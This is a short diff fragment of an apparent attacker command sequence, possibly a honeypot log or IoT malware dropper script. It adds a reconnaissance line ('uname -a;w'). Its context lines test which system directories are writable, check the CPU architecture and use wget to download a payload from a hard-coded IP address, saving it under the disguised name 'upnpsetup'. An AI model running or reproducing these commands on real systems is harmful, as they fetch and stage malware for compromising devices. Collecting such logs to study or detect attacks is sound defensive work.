@@ -190,6 +190,7 @@ mkdir /usr/;>/usr/.a && cd /usr/; rm -rf .a
 mkdir /var/;>/var/.a && cd /var/; rm -rf .a
 mkdir /var/home/user/fw/;>/var/home/user/fw/.a && cd /var/home/user/fw/; rm -rf .a
 mkdir /var/run/;>/var/run/.a && cd /var/run/; rm -rf .a
+uname -a;w
 uname -m
 wget -nc http://45.87.174.8/k.php?a=x86_64,2MWJMY85P3VUFVL0H -O ./upnpsetup
 wget -nc http://45.87.174.8/k.php?a=x86_64,6EVYL7G4NI5980PWH -O ./upnpsetup
